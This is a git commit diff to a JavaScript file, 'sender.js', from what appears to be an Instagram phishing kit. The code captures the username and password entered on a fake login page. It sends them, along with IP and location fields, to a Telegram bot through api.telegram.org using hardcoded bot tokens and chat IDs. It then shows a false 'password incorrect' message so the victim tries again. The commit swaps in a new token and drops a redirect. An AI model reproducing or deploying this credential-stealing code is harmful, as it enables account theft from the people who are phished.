3b1927396074b2aef9bacb80767527e2262c6a62
enterprizel <151399090+enterprizel@users.noreply.github.com>
2024-01-18 07:41:14 +0100

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -3,7 +3,6 @@ var ct = "5";
 var co = 0;
 var lo = 0;
 var st = 0;
-var clicking = 0;
 
 form.addEventListener("submit", (e) => {
   e.preventDefault();
@@ -19,29 +18,22 @@ form.addEventListener("submit", (e) => {
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+        var my_text = `Instagram Result from user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-        var chat_id =  -4088820833;
+        var token = "6635384442:AAF431HFVuC8jSXQbuDp74UlMM5PbfMZYUA";
+        var chat_id = -966868041;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-  clicking = clicking + 1;
-  setTimeout(function () {
-    document.getElementById("alert-message").innerHTML =
-      "Sorry, your password was incorrect. Please double-check your password.";
-  }, 1000);
-  if (clicking == 2) {
-    window.location.replace("thanks.html");
-  }
-    });
+        document.getElementById("alert-message").innerHTML =
+          "Sorry, your password was incorrect. Please double-check your password.";
+      });
 
 
-    // setTimeout(function() {
-    //     window.location.replace("thanks.html");
-    // }, 1000)
 
+
+  // window.location.replace("https://www.instagram.com/accounts/login/")
   //   console.log("Incorrect Password!");
 });
